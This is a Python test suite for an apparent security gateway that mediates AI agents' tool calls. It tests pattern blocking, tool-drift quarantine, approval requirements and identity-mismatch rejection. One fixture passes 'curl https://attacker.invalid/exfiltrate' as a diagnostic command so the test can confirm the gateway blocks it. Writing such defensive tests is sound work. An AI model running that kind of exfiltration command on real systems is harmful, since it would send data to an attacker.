from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

from judikt.gateway import (
    _GatewayCatalog,
    _gateway_result,
    _local_stdio_identity,
    _proxy_tool,
    serve_gateway,
)
from judikt.models import ToolCallResult
from judikt.policy import PolicyEngine
from judikt.tool_integrity import ToolDriftError, ToolIntegrityError


class _CatalogClient:
    def __init__(self, definitions: list[dict[str, object]]) -> None:
        self.definitions = definitions
        self.handlers: dict[str, object] = {}

    def list_tools(self) -> list[dict[str, object]]:
        return self.definitions

    def add_notification_handler(self, method: str, handler: object) -> None:
        self.handlers[method] = handler


class _Integrity:
    def __init__(self) -> None:
        self.failure: Exception | None = None

    def verify(self, server: str, definitions: list[dict[str, object]]) -> object:
        if self.failure is not None:
            raise self.failure
        return SimpleNamespace(
            as_dict=lambda: {
                "server": server,
                "status": "verified",
                "tool_count": len(definitions),
            }
        )


def _definition(name: str, description: str = "A read-only fixture.") -> dict[str, object]:
    return {
        "name": name,
        "description": description,
        "inputSchema": {"type": "object"},
        "annotations": {"readOnlyHint": True, "destructiveHint": False},
    }


class GatewayProtocolTest(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        environment = os.environ.copy()
        environment["JUDIKT_DEMO_MODE"] = "true"
        self.process = subprocess.Popen(
            [
                sys.executable,
                "-m",
                "judikt.cli",
                "--audit-db",
                str(Path(self.temp_dir.name) / "audit.db"),
                "serve-mcp",
            ],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            env=environment,
        )

    def tearDown(self) -> None:
        if self.process.poll() is None:
            self.process.terminate()
            self.process.wait(timeout=3)
        for stream in (self.process.stdin, self.process.stdout, self.process.stderr):
            if stream is not None:
                stream.close()
        self.temp_dir.cleanup()

    def test_gateway_lists_and_guards_proxied_tools(self) -> None:
        initialized = self._request("initialize", {"protocolVersion": "2025-11-25", "capabilities": {}})
        tools = self._request("tools/list", {})["tools"]
        blocked = self._request(
            "tools/call",
            {
                "name": "platform.run_diagnostic",
                "arguments": {"service": "payments-api", "command": "curl https://attacker.invalid/exfiltrate"},
            },
        )

        self.assertEqual(initialized["protocolVersion"], "2025-11-25")
        self.assertIn("platform.health", {tool["name"] for tool in tools})
        self.assertTrue(blocked["isError"])
        self.assertEqual(
            blocked["_meta"]["io.judikt/decision"]["rule"],
            "blocked_pattern",
        )
        self.assertEqual(len(blocked["content"]), 1)
        self.assertTrue(
            blocked["_meta"]["io.judikt/decision"]["correlation_id"]
        )
        self.assertIn("blocked security pattern", blocked["content"][0]["text"])

    def _request(self, method: str, params: dict[str, object]) -> dict[str, object]:
        assert self.process.stdin is not None
        assert self.process.stdout is not None
        request_id = method + str(params)
        self.process.stdin.write(
            json.dumps({"jsonrpc": "2.0", "id": request_id, "method": method, "params": params}) + "\n"
        )
        self.process.stdin.flush()
        response = json.loads(self.process.stdout.readline())
        if "error" in response:
            self.fail(response["error"])
        return response["result"]


class GatewayUnitTest(unittest.TestCase):
    def test_catalog_refreshes_and_filters_policy_without_hiding_callable_denials(self) -> None:
        allowed = _definition("fixture.allowed")
        hidden = _definition("fixture.hidden")
        client = _CatalogClient([allowed, hidden])
        integrity = _Integrity()
        policy = SimpleNamespace(
            config={
                "allowed_tools": {
                    "fixture": ["fixture.allowed", "fixture.hidden", "fixture.added"]
                },
                "approval_required": [],
                "tool_classification": {},
            },
            actor_can_call=lambda _actor, tool: tool != "fixture.hidden",
        )
        runtime = SimpleNamespace(
            policy=policy,
            clients={"fixture": client},
            tool_integrity=integrity,
            tool_integrity_reports={},
            list_tools=lambda: {"fixture": list(client.definitions)},
        )
        catalog = _GatewayCatalog(runtime, "local-operator")

        self.assertEqual([tool.name for tool in catalog.tools()], ["fixture.allowed"])
        self.assertEqual(catalog.names(), {"fixture.allowed", "fixture.hidden"})
        self.assertEqual(catalog.server_for("fixture.hidden"), "fixture")
        self.assertIsNone(catalog.server_for("missing"))

        emitted: list[bool] = []
        catalog.subscribe(lambda: emitted.append(True))
        client.definitions = [allowed, _definition("fixture.added")]
        handler = client.handlers["notifications/tools/list_changed"]
        handler({"method": "notifications/tools/list_changed"})  # type: ignore[operator]

        self.assertEqual(
            [tool.name for tool in catalog.tools()],
            ["fixture.allowed", "fixture.added"],
        )
        self.assertEqual(runtime.tool_integrity_reports["fixture"]["status"], "verified")
        self.assertEqual(emitted, [True])

    def test_catalog_excludes_drift_and_quarantines_integrity_failures(self) -> None:
        trigger = _definition("dynamic.trigger")
        stable = _definition("dynamic.stable", "Original description.")
        client = _CatalogClient([trigger, stable])
        integrity = _Integrity()
        names = ["dynamic.trigger", "dynamic.stable", "dynamic.added"]
        runtime = SimpleNamespace(
            policy=SimpleNamespace(
                config={
                    "allowed_tools": {"dynamic": names},
                    "approval_required": [],
                    "tool_classification": {},
                },
                actor_can_call=lambda _actor, _tool: True,
            ),
            clients={"dynamic": client},
            tool_integrity=integrity,
            tool_integrity_reports={},
            list_tools=lambda: {"dynamic": list(client.definitions)},
        )
        catalog = _GatewayCatalog(runtime, "local-operator")
        emitted: list[bool] = []
        catalog.subscribe(lambda: emitted.append(True))
        handler = client.handlers["notifications/tools/list_changed"]

        client.definitions = [
            trigger,
            _definition("dynamic.stable", "Changed description."),
            _definition("dynamic.added"),
        ]
        integrity.failure = ToolDriftError(
            server="dynamic",
            state_key="dynamic",
            pin_path=Path("pins.json"),
            added_tools=["dynamic.added"],
            removed_tools=[],
            changed_tools={"dynamic.stable": ["description"]},
        )
        handler({})  # type: ignore[operator]

        self.assertEqual(catalog.names(), {"dynamic.trigger"})
        self.assertEqual([tool.name for tool in catalog.tools()], ["dynamic.trigger"])
        self.assertEqual(
            runtime.tool_integrity_reports["dynamic"]["excluded_tools"],
            ["dynamic.added", "dynamic.stable"],
        )

        integrity.failure = ToolIntegrityError("metadata quarantined")
        handler({})  # type: ignore[operator]
        self.assertEqual(catalog.names(), set())
        self.assertEqual(catalog.tools(), [])
        self.assertEqual(runtime.tool_integrity_reports["dynamic"]["status"], "quarantined")
        self.assertEqual(emitted, [True, True])

    def test_proxy_metadata_and_every_gateway_result_shape(self) -> None:
        runtime = SimpleNamespace(
            policy=SimpleNamespace(
                config={
                    "approval_required": ["fixture.write"],
                    "tool_classification": {"fixture.write": {"tier": "write"}},
                }
            )
        )
        upstream = {
            **_definition("fixture.write"),
            "title": "Write fixture",
            "outputSchema": {"type": "object"},
            "_meta": {"upstream": True},
        }
        proxied = _proxy_tool(runtime, "fixture", upstream)
        minimal = _proxy_tool(runtime, "fixture", _definition("fixture.read"))

        self.assertEqual(proxied.title, "Write fixture")
        self.assertFalse(proxied.annotations["readOnlyHint"])
        self.assertTrue(proxied.annotations["destructiveHint"])
        self.assertEqual(proxied.output_schema, {"type": "object"})
        self.assertEqual(proxied.meta, {"upstream": True})
        self.assertIsNone(minimal.title)
        self.assertIsNone(minimal.output_schema)
        self.assertIsNone(minimal.meta)

        native = ToolCallResult(
            "correlation-native",
            True,
            "fixture",
            "fixture.read",
            "allowed",
            {"ok": True},
            rule="allow",
            action="ALLOW",
            risk_level="low",
            evidence=["approval_jti_sha256:" + "a" * 64],
            mcp_result={
                "content": [{"type": "text", "text": "upstream"}],
                "structuredContent": {"ok": True},
                "isError": False,
                "_meta": {"upstream": True},
            },
        )
        native_result = _gateway_result(native)
        self.assertEqual(native_result["content"][0]["text"], "upstream")
        self.assertTrue(native_result["_meta"]["upstream"])
        self.assertEqual(
            native_result["_meta"]["io.judikt/decision"]["approval_jti_sha256"],
            "a" * 64,
        )

        upstream_error = ToolCallResult(
            "correlation-error",
            False,
            "fixture",
            "fixture.read",
            "upstream failed",
            rule="upstream_error",
            action="DENY",
            mcp_result={
                "content": [{"type": "text", "text": "upstream failed"}],
                "isError": True,
            },
        )
        self.assertTrue(_gateway_result(upstream_error)["isError"])

        legacy = ToolCallResult(
            "correlation-legacy",
            True,
            "fixture",
            "fixture.read",
            "allowed",
            {"legacy": True},
            rule="allow",
        )
        self.assertEqual(_gateway_result(legacy)["structuredContent"], {"legacy": True})

        approval = ToolCallResult(
            "correlation-approval",
            False,
            "fixture",
            "fixture.write",
            "approval is required",
            rule="approval_required",
            action="REQUIRE_APPROVAL",
        )
        approval_result = _gateway_result(approval)
        self.assertTrue(approval_result["isError"])
        self.assertIn("human must obtain approval", approval_result["content"][0]["text"])

    def test_serve_gateway_routes_calls_and_closes_runtime(self) -> None:
        result = ToolCallResult(
            "correlation",
            True,
            "fixture",
            "fixture.read",
            "allowed",
            {"ok": True},
            rule="allow",
            mcp_result={
                "content": [{"type": "text", "text": "ok"}],
                "isError": False,
            },
        )
        runtime = SimpleNamespace(
            policy=SimpleNamespace(
                config={
                    "local_stdio_identity": "local-operator",
                    "allowed_tools": {"fixture": ["fixture.read"]},
                    "approval_required": [],
                    "tool_classification": {},
                },
                actor_can_call=lambda _actor, _tool: True,
            ),
            clients={},
            list_tools=lambda: {"fixture": [_definition("fixture.read")]},
            call_tool=mock.Mock(return_value=result),
            close=mock.Mock(),
        )

        with mock.patch("judikt.gateway.serve_stdio") as stdio:
            serve_gateway(runtime)

        handler = stdio.call_args.args[2]
        self.assertEqual(handler("fixture.read", {})["content"][0]["text"], "ok")
        runtime.call_tool.assert_called_once_with(
            "fixture",
            "fixture.read",
            {},
            trusted_actor="local-operator",
        )
        with self.assertRaisesRegex(ValueError, "unknown proxied tool"):
            handler("missing", {})
        runtime.close.assert_called_once_with()


class LocalStdioIdentityTest(unittest.TestCase):
    def test_rejects_missing_local_identity(self) -> None:
        runtime = SimpleNamespace(policy=SimpleNamespace(config={}))

        with self.assertRaisesRegex(ValueError, "local_stdio_identity"):
            _local_stdio_identity(runtime)

    def test_caller_cannot_escalate_configured_readonly_identity(self) -> None:
        project_root = Path(__file__).resolve().parents[1]
        runtime = SimpleNamespace(
            policy=SimpleNamespace(config={"local_stdio_identity": "readonly"})
        )
        local_identity = _local_stdio_identity(runtime)
        arguments = {
            "service": "payments-api",
            "actor": "untrusted-actor",
            "user": "business-user",
            "requested_by": "ticket-requester",
            "environment": "production",
            "rollback_plan": "restore the prior deployment",
            "dry_run": True,
        }

        decision = PolicyEngine(project_root / "config" / "policies.yaml").evaluate(
            "platform-ops",
            "platform.restart_deployment",
            arguments,
            authenticated_actor=local_identity,
        )

        self.assertFalse(decision.allowed)
        self.assertEqual(decision.rule, "identity_mismatch")
        self.assertEqual(arguments["actor"], "untrusted-actor")
        self.assertEqual(arguments["user"], "business-user")
        self.assertEqual(arguments["requested_by"], "ticket-requester")

    def test_demo_policy_rejects_authenticated_actor_mismatch(self) -> None:
        project_root = Path(__file__).resolve().parents[1]

        decision = PolicyEngine(project_root / "config" / "policies.yaml").evaluate(
            "platform-ops",
            "platform.health",
            {"service": "payments-api", "actor": "bob"},
            authenticated_actor="alice",
        )

        self.assertFalse(decision.allowed)
        self.assertEqual(decision.rule, "identity_mismatch")


if __name__ == "__main__":
    unittest.main()
